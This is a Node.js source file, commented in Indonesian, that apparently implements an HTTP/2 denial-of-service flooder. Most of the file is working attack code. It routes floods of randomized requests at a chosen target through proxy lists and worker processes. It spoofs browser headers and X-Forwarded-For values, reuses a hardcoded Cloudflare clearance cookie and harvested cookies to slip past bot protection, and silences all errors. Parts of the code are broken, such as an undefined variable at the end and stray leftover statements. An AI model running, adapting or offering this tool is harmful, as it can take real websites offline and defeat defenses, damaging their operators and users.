const net = require("net");
const http2 = require("http2");
const https = require("https");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const cloudscraper = require('cloudscraper');
const scp = require("set-cookie-parser");
var colors = require("colors");
const randomUseragent = require('random-useragent');
const fs = require("fs");

async function loadConfig() {
  try {
    const data = await fs.promises.readFile('config.json', 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Gagal memuat konfigurasi:', error);
    throw error;
  }
}

function requestAsync(targetUrl) {
  return new Promise((resolve, reject) => {
    const options = {
      ...url.parse(targetUrl),
      method: "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
      },
      // Mengatur agar selalu menggunakan HTTP/1.1
      agent: new https.Agent({ keepAlive: true, maxVersion: 'TLSv1.3' })
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => data += chunk);
      res.on("end", () => resolve(data));
    });

    req.on("error", (e) => reject(e));
    req.end();
  });
}

async function main() {
  try {
    const args = process.argv.slice(2); // Ambil argumen dari CLI
    let targetUrl = args[0]; // Target URL dari argumen pertama

    if (!targetUrl) {
      // Jika target tidak diberikan melalui args, ambil dari config.json
      const config = await loadConfig();
      targetUrl = config.targetUrl;
    }

    if (!targetUrl) {
      throw new Error("targetUrl tidak ditemukan, masukkan melalui argumen atau config.json");
    }

    console.log("Menargetkan URL:", targetUrl);
    const response = await requestAsync(targetUrl);
    console.log("Response dari jaringan:", response);

  } catch (error) {
    console.error("Terjadi kesalahan:", error);
  }
}

main();

function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }


const accept_header = [
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript'
],
cache_header = [
   'max-age=0',
   'no-cache',
   'no-store', 
   'pre-check=0',
   'post-check=0',
   'must-revalidate',
   'proxy-revalidate',
   's-maxage=604800',
   'no-cache, no-store,private, max-age=0, must-revalidate',
   'no-cache, no-store,private, s-maxage=604800, must-revalidate',
   'no-cache, no-store,private, max-age=604800, must-revalidate',
   'no-transform',
   'only-if-cached',
   'public',
   'private',
   'stale-if-error',
   'max-age=31557600',
   'max-age=2592000',
   's-maxage',
   'min-fresh',
   'max-age=31536000,public',
   'max-age=31536000,public,immutable',
   'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
   'public, immutable, max-age=31536000',
   'max-stale',
   'max-age=315360000',
   'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800'

],
Generate_Encoding = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'

],
language_header = [
 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5'
],

dest_header = [
   'audio',
   'audioworklet',
   'document',
   'embed',
   'empty',
   'font',
   'frame',
   'iframe',
   'image',
   'manifest',
   'object',
   'paintworklet',
   'report',
   'script',
   'serviceworker',
   'sharedworker',
   'style',
   'track',
   'video',
   'worker',
   'xslt',
   "unknown",
   "subresource"
],

mode_header = [
   'cors',
   'navigate',
   'no-cors',
   'same-origin',
   'websocket'
],
site_header = [
   'cross-site',
   'same-origin',
   'same-site',
   'none'
],
sec_ch_ua = [
   '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
   '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
   '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
   '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
   '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
   '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
   '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
   '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
   '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
   '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
   '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
   '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="8", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="8", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="8", "Google Chrome";v="112"',
   '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="24", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="24", "Google Chrome";v="112"',
   '"Chromium";v="116", "Not)A;Brand";v="99", "Google Chrome";v="116"',
   '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
   '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"',
   '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"',
   '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="112.0.0.0"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="112.0.0.0"',
   '"Chromium";v="116.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="116.0.0.0"',
   '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"',
   '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"',
   '"Chromium";v="113.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="113.0.0.0"',
   '"Chromium";v="112.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="112.0.0.0"'
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
  console.log('node raw target time rate thread proxy'.rainbow);
  process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const browsers = [
    "Chrome/91.0.4472.124",
    "Safari/537.36",
    "Firefox/89.0",
    "Edge/91.0.864.54",
    "Opera/77.0.4054.172"
];
const skid = [
    "10005465237",
    "8851064634",
    "89313646253",
    "2206423942",
    "12635495631"
];
function getRandomValue(array) {
    return array[Math.floor(Math.random() * array.length)];
}
const operatingSystems = ["Windows NT 10.0", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"]; // Contoh OS
const architectures = {
    "Windows NT 10.0": "Win64; x64",
    "Macintosh; Intel Mac OS X 10_15_7": "Intel Mac OS X",
    "X11; Linux x86_64": "Linux x86_64"
};
const randomSkid = getRandomValue(skid);
const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS];
const randomBrowser = getRandomValue(browsers);
const uap = `Mozilla/5.0 (${randomOS}; ${randomSkid}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`;

const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
] 
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:P-256:P-384:P-521:X448";

const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TLSv1_3 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";"TLSv1_3_method","TLS_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const rateHeaders = [
   { "akamai-origin-hop": randstr(5) },
   { "source-ip": randstr(5) },
   { "via": randstr(5) },
   { "cluster-ip": randstr(5) },
   { "upgrade-insecure-request": "1" },
   { "accept": accept_header[Math.floor(Math.random() * accept_header.length)] },
   { "accept-charset": accept_header[Math.floor(Math.random() * accept_header.length)] },
   { "Cache-Control": 'no-cache' },
   { "pragma": "no-cache" },
   { "x-xss-protection": "1;mode=block" },
   { "x-content-type-options": "nosniff" },
   { "accept-datetime": accept_header[Math.floor(Math.random() * accept_header.length)] },
   { "Sec-Fetch-Site": "same-origin" },
   { "Sec-Fetch-Mode": "navigate" },
   { "Sec-Fetch-Dest": "document" },
   { "X-Forwarded-For": "2400:cb00::/32" }
];

const rateHeaders2 = [
   { "akamai-origin-hop": randstr(5) },
   { "source-ip": randstr(5) },
   { "via": randstr(5) },
   { "X-Vercel-Cache": randstr(5) },
   { "cluster-ip": randstr(5) },
   { "X-Requested-With": 'XMLHttpRequest' },
   { "X-Frame-Options": "deny" },
   { "Max-Forwards": '10' },
   { "Refresh": '5' },
   { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
   { "accept-encoding": Generate_Encoding[Math.floor(Math.random() * Generate_Encoding.length)] },
   { "Cookie": "__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0" },
   { "token": "98384c91045840d3b957ce34ef851ff5" }
];
const dynHeaders = {
   ...headers,
   ...rateHeaders2[Math.floor(Math.random()*rateHeaders.length)],
   ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
 };

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
colors.enable();
const coloredString = "Recommended big proxyfile if hard target".white;
if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
   console.clear()
   console.log('Target: '+process.argv[2]);
 console.log('Time: '+process.argv[3]);
 console.log('Rate: '+process.argv[4]);
 console.log('Thread(s): '+process.argv[5]);
 console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
 console.log("Note: ".brightCyan + coloredString);
       cluster.fork();

   }
} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 1) }}

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function cookieString(cookie) {
   var s = "";
   for (var c in cookie) {
     s = `${s} ${cookie[c].name}=${cookie[c].value};`;
   }
   var s = s.substring(1);
   return s.substring(0, s.length - 1);
 }

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}


function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"

    let userAgent = randomUseragent.getRandom(function (ua) {
       return ua.browserName === 'Firefox';
   });

   let headers = {
    ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.' + parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
    ":method": "GET",
    "referer": "https://" + parsedTarget.host + parsedTarget.path,
    "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
    "Accept-Encoding": "gzip, deflate, br",
    ":path": parsedTarget.path + (parsedTarget.path.includes('?') ? '&' : '?') + "extra_param=" + Math.random().toString(36).substring(2),
    ":scheme": "https",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": uap,
    "origin": "https://" + parsedTarget.host,
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "X-Forwarded-For": "2400:cb00::/32",
    "Cache-Control": "max-age=0",
    "Cookie": "__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
    "token":"6f9a2202213848f5bff934592489e351"
};

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)

        const settings = {
           enablePush: false,
           initialWindowSize: 1073741823
       };

        const tlsOptions = {
           port: parsedPort,
           secure: true,
           ALPNProtocols: [
               "h2","h3","http/1.1"
           ],
           ciphers: ciphers,
           sigalgs: sigalgs,
           requestCert: true,
           socket: connection,
           ecdhCurve: ecdhCurve,
           honorCipherOrder: false,
           followAllRedirects: true,
           challengeToSolve: 45,
           clientTimeout: 20000,
           clientlareMaxTimeout: 5000,
           host: parsedTarget.host,
           rejectUnauthorized: false,
           clientCertEngine: "DYNAMIC",
           secureOptions: secureOptions,
           secureContext: secureContext,
           servername: parsedTarget.host,
           secureProtocol: secureProtocol
       };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 100000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
               headerTableSize: 65536,
               maxConcurrentStreams: 1000,
               initialWindowSize: 6291456,
               maxHeaderListSize: 262144,
               enablePush: false
           },
           maxSessionMemory: 3333,
           maxDeflateDynamicTableSize: 4294967295,
           createConnection: () => tlsConn,
           socket: connection,
       });

       client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           maxFrameSize : 40000,
           enablePush: false
       });

       client.setMaxListeners(0);
       client.settings(settings);

let bypassedCookie = ""; // Variabel untuk menyimpan cookie bypass

client.on("connect", () => {
    const IntervalAttack = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
            // Menggabungkan header dengan cookie bypass jika ada
            const currentHeaders = {
                ...headers,
                "Cookie": bypassedCookie // Tambahkan cookie bypass ke header permintaan
            };

            const request = client.request(currentHeaders)
                .on("response", response => {
                    if (response['set-cookie']) {
                        // Parsing `Set-Cookie` untuk mendapatkan cookie bypass
                        const cookies = scp.parse(response["set-cookie"]);
                        bypassedCookie = cookieString(cookies); // Simpan cookie di variabel `bypassedCookie`
                    }
                       request.close();
                       request.destroy();
                       return
                   });
                   request.end();
               }
           }, 550); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
const client = http2.connect(parsed.href, clientOptions, function() {
 });

